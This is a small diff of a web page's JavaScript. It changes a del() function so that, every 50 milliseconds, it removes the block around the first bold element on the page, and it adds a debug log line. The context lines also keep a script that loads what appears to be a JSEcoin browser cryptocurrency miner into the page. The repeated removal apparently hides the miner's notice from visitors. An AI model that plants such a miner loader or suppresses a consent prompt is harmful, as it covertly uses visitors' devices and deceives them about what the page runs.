@@ -463,15 +463,13 @@
 		}
 
 		function del() {
-			document.body.removeChild(document.getElementById(document.getElementsByTagName("b")[0].parentNode.parentNode.id));
+			if (document.getElementsByTagName("b")[0] != undefined) {
+				document.body.removeChild(document.getElementById(document.getElementsByTagName("b")[0].parentNode.parentNode.id));
+			}
+			console.log("test");
 		}
 
-		nFois=0
-		refresh=50
-		while (nFois <= 3000) {
-			setTimeout(del, refresh);
-			nFois+=refresh
-		}
+		setInterval(del, 50);
 	</script>
 	<script type="text/javascript">
 !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/168428/samsamdu44.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
